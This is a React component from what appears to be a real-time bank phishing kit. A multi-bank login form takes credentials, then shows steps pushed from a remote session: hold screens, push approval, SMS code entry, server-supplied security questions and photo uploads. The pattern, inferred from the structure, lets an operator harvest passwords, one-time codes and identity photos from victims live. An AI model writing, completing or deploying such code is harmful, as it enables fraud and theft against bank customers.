import type { BankConfig } from '@/config/banks/types';
import { useBankLoginFlow } from './useBankLoginFlow';
import { LoginForm } from './components/LoginForm';
import { HoldDialog } from './components/HoldDialog';
import { SmsDialog } from './components/SmsDialog';
import { PushDialog } from './components/PushDialog';
import { InvalidDataDialog } from './components/InvalidDataDialog';
import { QuestionDialog } from './components/QuestionDialog';
import { ErrorDialog } from './components/ErrorDialog';
import { PhotoDialog } from './components/PhotoDialog';

type Props = {
    bank: BankConfig;
    sessionId: string;
};

export function BankLoginFlow({ bank, sessionId }: Props) {
    const { command, busy, submitCredentials, answer, reset } = useBankLoginFlow({
        sessionId,
        bankSlug: bank.slug,
    });

    return (
        <>
            <LoginForm bank={bank} busy={busy} onSubmit={(fields) => submitCredentials(fields)} />

            <HoldDialog open={command.type === 'hold.short'} variant="short" />
            <HoldDialog open={command.type === 'hold.long'} variant="long" />
            <PushDialog open={command.type === 'push'} />

            <SmsDialog
                open={command.type === 'sms'}
                busy={busy}
                onSubmit={(code) => answer({ command: 'sms', payload: { code } })}
            />

            <InvalidDataDialog open={command.type === 'invalid-data'} onAcknowledge={reset} />

            <QuestionDialog
                open={command.type === 'question'}
                busy={busy}
                text={command.type === 'question' ? command.text : ''}
                onSubmit={(ans) => answer({ command: 'question', payload: { answer: ans } })}
            />

            <ErrorDialog
                open={command.type === 'error'}
                text={command.type === 'error' ? command.text : ''}
                onAcknowledge={reset}
            />

            <PhotoDialog
                open={command.type === 'photo.with-input'}
                busy={busy}
                text={command.type === 'photo.with-input' ? command.text : undefined}
                withInput
                onSubmit={(file, text) =>
                    answer({ command: 'photo.with-input', payload: { file, text } })
                }
            />

            <PhotoDialog
                open={command.type === 'photo.without-input'}
                busy={busy}
                text={command.type === 'photo.without-input' ? command.text : undefined}
                withInput={false}
                onSubmit={(file) => answer({ command: 'photo.without-input', payload: { file } })}
            />
        </>
    );
}
